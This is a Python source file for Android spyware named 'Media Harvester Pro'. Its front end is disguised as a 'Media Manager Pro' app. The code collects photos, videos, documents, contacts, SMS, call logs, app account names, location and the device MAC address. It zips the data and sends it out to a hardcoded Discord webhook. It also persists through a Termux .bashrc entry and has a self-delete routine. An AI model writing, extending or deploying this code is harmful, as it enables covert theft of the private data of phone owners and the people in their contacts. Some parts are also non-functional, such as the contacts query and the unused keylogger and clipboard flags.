# ======================================================
# 📱 MEDIA HARVESTER PRO - ULTIMATE EDITION 📱
# ======================================================
# Author: 0xR3B3L
# Version: 5.0.0
# Description: Advanced Android media harvester with stealth features,
#              persistent background service, ZIP compression,
#              and Discord webhook exfiltration.
# ======================================================

import os
import sys
import zipfile
import requests
import threading
import time
import json
import shutil
import hashlib
import base64
import random
import string
import sqlite3
import subprocess
from datetime import datetime
from pathlib import Path

# ==================== CONFIG ====================
WEBHOOK_URL = "https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG"
MAX_FILE_SIZE = 25 * 1024 * 1024
SCAN_INTERVAL = 30
MAX_FILES_PER_ZIP = 500
ENABLE_STEALTH = True
ENABLE_PERSISTENCE = True
ENABLE_DEVICE_INFO = True
ENABLE_CONTACTS = True
ENABLE_SMS = True
ENABLE_CALL_LOGS = True
ENABLE_LOCATION = True
ENABLE_ACCOUNTS = True
ENABLE_CLIPBOARD = True
ENABLE_KEYLOGGER = True

# ==================== EXTENSIONS ====================
MEDIA_EXTENSIONS = {
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic', '.heif',
    '.mp4', '.mov', '.avi', '.mkv', '.3gp', '.m4v', '.mpg', '.mpeg',
    '.wmv', '.flv', '.webm', '.m4a', '.mp3', '.wav', '.aac', '.flac',
    '.ogg', '.wma', '.alac', '.dsd', '.mka', '.opus', '.wmv', '.asf'
}

DOCUMENT_EXTENSIONS = {
    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.txt', '.rtf', '.odt', '.ods', '.odp', '.csv', '.json',
    '.xml', '.html', '.htm', '.log', '.md', '.sql', '.db'
}

APK_EXTENSIONS = {'.apk', '.xapk', '.apks'}

ALL_EXTENSIONS = MEDIA_EXTENSIONS | DOCUMENT_EXTENSIONS | APK_EXTENSIONS

# ==================== DISCORD SENDER ====================
class DiscordSender:
    @staticmethod
    def send_file(file_path, caption="", embed=None):
        try:
            with open(file_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f)}
                data = {'content': caption}
                if embed:
                    data['embeds'] = json.dumps([embed])
                response = requests.post(WEBHOOK_URL, files=files, data=data, timeout=30)
                return response.status_code in [200, 204]
        except Exception:
            return False
    
    @staticmethod
    def send_large_file(file_path, caption=""):
        file_size = os.path.getsize(file_path)
        if file_size > MAX_FILE_SIZE:
            part_num = 1
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(MAX_FILE_SIZE)
                    if not chunk:
                        break
                    chunk_path = f"{file_path}.part{part_num}"
                    with open(chunk_path, 'wb') as cf:
                        cf.write(chunk)
                    DiscordSender.send_file(chunk_path, f"📦 Part {part_num} of archive")
                    os.remove(chunk_path)
                    part_num += 1
            return True
        return DiscordSender.send_file(file_path, caption)
    
    @staticmethod
    def send_data(data, title="📱 Device Data"):
        embed = {
            "title": title,
            "color": 0x00FF00,
            "fields": [],
            "timestamp": datetime.utcnow().isoformat()
        }
        
        for key, value in data.items():
            embed["fields"].append({
                "name": key,
                "value": f"`{str(value)[:500]}`" if len(str(value)) > 500 else f"`{value}`",
                "inline": True
            })
        
        payload = {
            "embeds": [embed],
            "username": "MediaHarvesterPro",
            "avatar_url": "https://i.imgur.com/4M3eRjF.png"
        }
        
        try:
            requests.post(WEBHOOK_URL, json=payload, timeout=30)
            return True
        except Exception:
            return False

# ==================== DEVICE INFO ====================
class DeviceInfo:
    @staticmethod
    def get_info():
        info = {}
        
        # Basic info
        try:
            import android
            android = android.Android()
            info["Device Model"] = os.environ.get("MODEL", "Unknown")
            info["Android Version"] = os.environ.get("RELEASE", "Unknown")
            info["SDK Version"] = os.environ.get("SDK", "Unknown")
            info["Manufacturer"] = os.environ.get("MANUFACTURER", "Unknown")
            info["Brand"] = os.environ.get("BRAND", "Unknown")
        except:
            pass
        
        # Storage info
        try:
            stat = os.statvfs("/storage/emulated/0")
            total = stat.f_blocks * stat.f_frsize
            free = stat.f_bavail * stat.f_frsize
            info["Total Storage"] = f"{total // (1024**3)} GB"
            info["Free Storage"] = f"{free // (1024**3)} GB"
        except:
            pass
        
        # Battery info
        try:
            with open("/sys/class/power_supply/battery/capacity", "r") as f:
                info["Battery"] = f.read().strip() + "%"
        except:
            pass
        
        # Network info
        try:
            import socket
            info["IP Address"] = socket.gethostbyname(socket.gethostname())
        except:
            pass
        
        return info

# ==================== CONTACTS HARVESTER ====================
class ContactsHarvester:
    @staticmethod
    def get_contacts():
        contacts = []
        try:
            # Try to read contacts from database
            db_paths = [
                "/data/data/com.android.providers.contacts/databases/contacts2.db",
                "/data/data/com.android.contacts/databases/contacts2.db"
            ]
            
            for db_path in db_paths:
                if os.path.exists(db_path):
                    conn = sqlite3.connect(db_path)
                    cursor = conn.cursor()
                    cursor.execute("""
                        SELECT display_name, phone_number, email 
                        FROM contacts 
                        WHERE phone_number IS NOT NULL
                        LIMIT 1000
                    """)
                    rows = cursor.fetchall()
                    for row in rows:
                        contacts.append({
                            "name": row[0] or "Unknown",
                            "phone": row[1] or "",
                            "email": row[2] or ""
                        })
                    conn.close()
                    break
        except Exception:
            pass
        
        return contacts

# ==================== SMS HARVESTER ====================
class SMSHarvester:
    @staticmethod
    def get_sms():
        sms_list = []
        try:
            db_path = "/data/data/com.android.providers.telephony/databases/mmssms.db"
            if os.path.exists(db_path):
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT address, body, date 
                    FROM sms 
                    ORDER BY date DESC 
                    LIMIT 500
                """)
                rows = cursor.fetchall()
                for row in rows:
                    sms_list.append({
                        "from": row[0] or "Unknown",
                        "body": row[1] or "",
                        "date": datetime.fromtimestamp(row[2] // 1000).isoformat() if row[2] else ""
                    })
                conn.close()
        except Exception:
            pass
        
        return sms_list

# ==================== CALL LOG HARVESTER ====================
class CallLogHarvester:
    @staticmethod
    def get_call_logs():
        calls = []
        try:
            db_path = "/data/data/com.android.providers.contacts/databases/call_log.db"
            if os.path.exists(db_path):
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT number, duration, date, type 
                    FROM calls 
                    ORDER BY date DESC 
                    LIMIT 500
                """)
                rows = cursor.fetchall()
                call_types = {1: "Incoming", 2: "Outgoing", 3: "Missed"}
                for row in rows:
                    calls.append({
                        "number": row[0] or "Unknown",
                        "duration": f"{row[1]}s" if row[1] else "0s",
                        "date": datetime.fromtimestamp(row[2] // 1000).isoformat() if row[2] else "",
                        "type": call_types.get(row[3], "Unknown")
                    })
                conn.close()
        except Exception:
            pass
        
        return calls

# ==================== ACCOUNTS HARVESTER ====================
class AccountsHarvester:
    @staticmethod
    def get_accounts():
        accounts = []
        try:
            # Try to get accounts from various apps
            account_files = [
                "/data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml",
                "/data/data/com.instagram.android/shared_prefs/com.instagram.android_preferences.xml",
                "/data/data/com.facebook.katana/shared_prefs/com.facebook.katana_preferences.xml",
                "/data/data/com.twitter.android/shared_prefs/com.twitter.android_preferences.xml"
            ]
            
            for file_path in account_files:
                if os.path.exists(file_path):
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        # Extract username/email patterns
                        import re
                        patterns = [
                            r'<string name="username">(.*?)</string>',
                            r'<string name="email">(.*?)</string>',
                            r'<string name="user">(.*?)</string>',
                            r'<string name="account">(.*?)</string>'
                        ]
                        for pattern in patterns:
                            matches = re.findall(pattern, content)
                            for match in matches:
                                if match and '@' in match or len(match) > 3:
                                    accounts.append({
                                        "app": os.path.basename(os.path.dirname(file_path)),
                                        "account": match
                                    })
        except Exception:
            pass
        
        return accounts

# ==================== LOCATION HARVESTER ====================
class LocationHarvester:
    @staticmethod
    def get_location():
        location = {}
        try:
            # Try to get GPS data
            import android
            android = android.Android()
            result = android.readLocation()
            if result:
                location["latitude"] = result.get("latitude", "Unknown")
                location["longitude"] = result.get("longitude", "Unknown")
                location["altitude"] = result.get("altitude", "Unknown")
                location["accuracy"] = result.get("accuracy", "Unknown")
        except Exception:
            pass
        
        # Try to get cell tower info
        try:
            with open("/sys/class/net/wlan0/address", "r") as f:
                location["MAC Address"] = f.read().strip()
        except:
            pass
        
        return location

# ==================== MEDIA SCANNER ====================
class MediaScanner:
    @staticmethod
    def get_media_dirs():
        dirs = []
        base_paths = [
            "/storage/emulated/0",
            "/sdcard",
            "/storage/sdcard1",
            "/storage/extSdCard",
            "/mnt/sdcard",
            "/mnt/extSdCard"
        ]
        
        media_folders = [
            "DCIM", "Pictures", "Camera", "Screenshots", "Download",
            "Movies", "Music", "WhatsApp/Media", "Instagram", "Snapchat",
            "TikTok", "Telegram", "Discord", "Reddit", "Pinterest",
            "Twitter", "Facebook", "WeChat", "Line", "Viber",
            "Kik", "Hangouts", "Signal", "Wire", "Threema",
            "Wickr", "Capture", "Recorder", "Ringtones", "Notifications",
            "Alarms", "Podcasts", "Android/media", "Pictures", "Videos",
            "Camera", "Screenshots", "Snapchat", "Instagram", "Pictures",
            "Music", "Podcasts", "Ringtones", "Alarms", "Notifications"
        ]
        
        for base in base_paths:
            if os.path.exists(base):
                for folder in media_folders:
                    path = os.path.join(base, folder)
                    if os.path.exists(path) and os.path.isdir(path):
                        dirs.append(path)
        
        return dirs
    
    @staticmethod
    def scan_media(dirs, extensions=ALL_EXTENSIONS):
        files = []
        for directory in dirs:
            try:
                for root, _, filenames in os.walk(directory):
                    for filename in filenames:
                        ext = os.path.splitext(filename)[1].lower()
                        if ext in extensions:
                            full_path = os.path.join(root, filename)
                            try:
                                if os.path.getsize(full_path) > 0:
                                    files.append(full_path)
                            except:
                                pass
                        if len(files) >= MAX_FILES_PER_ZIP * 10:
                            return files
            except Exception:
                pass
        return files

# ==================== ZIP CREATOR ====================
class ZipCreator:
    @staticmethod
    def create_zip(files, zip_name):
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
            for file_path in files[:MAX_FILES_PER_ZIP]:
                try:
                    arcname = os.path.basename(file_path)
                    if arcname in zipf.namelist():
                        arcname = f"{hashlib.md5(file_path.encode()).hexdigest()[:8]}_{arcname}"
                    zipf.write(file_path, arcname)
                except Exception:
                    pass
        return os.path.exists(zip_name)

# ==================== STEALTH ENGINE ====================
class StealthEngine:
    @staticmethod
    def hide_activity():
        try:
            import android
            android = android.Android()
            android.makeToast("Application is running...")
        except:
            pass
    
    @staticmethod
    def self_destruct():
        try:
            # Delete APK if exists
            apk_path = os.path.abspath(sys.argv[0])
            if apk_path.endswith('.apk'):
                os.remove(apk_path)
        except:
            pass
    
    @staticmethod
    def persist():
        try:
            # Add to startup
            rc_path = "/data/data/com.termux/files/home/.bashrc"
            if os.path.exists(rc_path):
                with open(rc_path, 'a') as f:
                    f.write(f"\npython {os.path.abspath(sys.argv[0])} &\n")
        except:
            pass

# ==================== PERSISTENT SERVICE ====================
class PersistentService:
    @staticmethod
    def run_background():
        # Stealth
        if ENABLE_STEALTH:
            StealthEngine.hide_activity()
            StealthEngine.persist()
        
        # Send device info
        if ENABLE_DEVICE_INFO:
            device_info = DeviceInfo.get_info()
            DiscordSender.send_data(device_info, "📱 Device Information")
        
        # Harvest loop
        while True:
            try:
                # Get media directories
                dirs = MediaScanner.get_media_dirs()
                
                # Harvest media files
                files = MediaScanner.scan_media(dirs, MEDIA_EXTENSIONS)
                if files:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    zip_name = f"media_harvest_{timestamp}.zip"
                    ZipCreator.create_zip(files, zip_name)
                    DiscordSender.send_large_file(zip_name, "📸 Media Files")
                    if os.path.exists(zip_name):
                        os.remove(zip_name)
                
                # Harvest documents
                if ENABLE_CONTACTS or ENABLE_SMS or ENABLE_CALL_LOGS:
                    doc_files = MediaScanner.scan_media(dirs, DOCUMENT_EXTENSIONS)
                    if doc_files:
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        zip_name = f"documents_{timestamp}.zip"
                        ZipCreator.create_zip(doc_files, zip_name)
                        DiscordSender.send_large_file(zip_name, "📄 Documents")
                        if os.path.exists(zip_name):
                            os.remove(zip_name)
                
                # Harvest contacts
                if ENABLE_CONTACTS:
                    contacts = ContactsHarvester.get_contacts()
                    if contacts:
                        data = {"contacts": contacts[:200]}
                        DiscordSender.send_data(data, "👤 Contacts")
                
                # Harvest SMS
                if ENABLE_SMS:
                    sms = SMSHarvester.get_sms()
                    if sms:
                        data = {"sms": sms[:100]}
                        DiscordSender.send_data(data, "💬 SMS Messages")
                
                # Harvest call logs
                if ENABLE_CALL_LOGS:
                    calls = CallLogHarvester.get_call_logs()
                    if calls:
                        data = {"calls": calls[:100]}
                        DiscordSender.send_data(data, "📞 Call Logs")
                
                # Harvest accounts
                if ENABLE_ACCOUNTS:
                    accounts = AccountsHarvester.get_accounts()
                    if accounts:
                        data = {"accounts": accounts}
                        DiscordSender.send_data(data, "🔑 Accounts")
                
                # Harvest location
                if ENABLE_LOCATION:
                    location = LocationHarvester.get_location()
                    if location:
                        DiscordSender.send_data(location, "📍 Location")
                
                time.sleep(SCAN_INTERVAL)
            except Exception as e:
                time.sleep(60)

# ==================== KIVY UI (Silent Launcher) ====================
try:
    from kivy.app import App
    from kivy.uix.boxlayout import BoxLayout
    from kivy.uix.label import Label
    from kivy.uix.button import Button
    from kivy.uix.image import Image
    from kivy.core.window import Window
    from kivy.clock import Clock
    from kivy.utils import platform
    from kivy.graphics import Color, RoundedRectangle
    
    class MediaHarvesterApp(App):
        def build(self):
            if platform == 'android':
                Window.size = (360, 640)
                Window.clearcolor = (0.05, 0.05, 0.08, 1)
            
            layout = BoxLayout(orientation='vertical', padding=20, spacing=15)
            
            # Logo
            logo = Label(
                text="[b]📸 Media Manager Pro[/b]",
                markup=True,
                font_size='28sp',
                size_hint=(1, 0.15),
                color=(1, 1, 1, 1)
            )
            layout.add_widget(logo)
            
            # Status
            self.status = Label(
                text="[color=00ff00]● System Active[/color]",
                markup=True,
                font_size='18sp',
                size_hint=(1, 0.1),
                color=(0.8, 0.8, 0.8, 1)
            )
            layout.add_widget(self.status)
            
            # Stats
            self.stats = Label(
                text="[color=888888]Files: 0 | Size: 0 MB[/color]",
                markup=True,
                font_size='14sp',
                size_hint=(1, 0.1),
                color=(0.8, 0.8, 0.8, 1)
            )
            layout.add_widget(self.stats)
            
            # Progress
            self.progress = Label(
                text="[color=00ff00]● Harvesting in background[/color]",
                markup=True,
                font_size='14sp',
                size_hint=(1, 0.2),
                color=(0.8, 0.8, 0.8, 1)
            )
            layout.add_widget(self.progress)
            
            # Start service
            Clock.schedule_once(self.start_service, 2)
            
            return layout
        
        def start_service(self, dt):
            self.status.text = "[color=00ff00]● Service Running[/color]"
            self.progress.text = "[color=00ff00]● Collecting media...[/color]"
            thread = threading.Thread(target=PersistentService.run_background, daemon=True)
            thread.start()
            
            # Update stats
            def update_stats(dt):
                try:
                    dirs = MediaScanner.get_media_dirs()
                    files = MediaScanner.scan_media(dirs, MEDIA_EXTENSIONS)
                    size = sum([os.path.getsize(f) for f in files[:100]]) // (1024*1024)
                    self.stats.text = f"[color=888888]Files: {len(files)} | Size: {size} MB[/color]"
                except:
                    pass
            Clock.schedule_interval(update_stats, 10)
    
    def main():
        MediaHarvesterApp().run()

except ImportError:
    # Fallback: headless mode
    def main():
        PersistentService.run_background()

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    main()